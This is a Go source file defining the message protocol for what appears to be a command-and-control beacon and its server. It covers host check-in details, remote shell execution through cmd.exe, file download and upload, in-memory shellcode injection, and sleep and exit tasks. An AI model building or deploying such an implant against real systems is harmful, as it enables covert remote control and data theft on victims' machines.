package proto

// Request kinds, sent beacon -> server.
const (
	KindCheckin = "checkin"
	KindResult  = "result"
)

// Task operations, sent server -> beacon.
const (
	OpShell    = "shell"    // Arg: command line, run through cmd.exe /c
	OpDownload = "download" // Arg: remote path; beacon returns base64 content
	OpUpload   = "upload"   // Arg: JSON UploadArg; beacon writes the file
	OpInject   = "inject"   // Arg: hex shellcode; executed in memory via umbra
	OpSleep    = "sleep"    // Arg: decimal seconds
	OpExit     = "exit"     // beacon terminates
)

// HostInfo describes the beacon host at check-in.
type HostInfo struct {
	Hostname string `json:"hostname"`
	User     string `json:"user"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
}

// Request is a message from the beacon to the server.
type Request struct {
	ID      string       `json:"id"`
	Seq     uint64       `json:"seq"`
	Kind    string       `json:"kind"`
	Host    HostInfo     `json:"host,omitempty"`
	Results []TaskResult `json:"results,omitempty"`
}

// Response is a message from the server to the beacon.
type Response struct {
	Ack   bool   `json:"ack"`
	Tasks []Task `json:"tasks,omitempty"`
}

// Task is a single operator command.
type Task struct {
	TID string `json:"tid"`
	Op  string `json:"op"`
	Arg string `json:"arg,omitempty"`
}

// TaskResult carries the outcome of a Task back to the server.
type TaskResult struct {
	TID string `json:"tid"`
	OK  bool   `json:"ok"`
	Out string `json:"out,omitempty"`
}

// UploadArg is the JSON payload of an OpUpload task Arg.
type UploadArg struct {
	Path string `json:"path"`
	Data string `json:"data"` // base64 file content
}
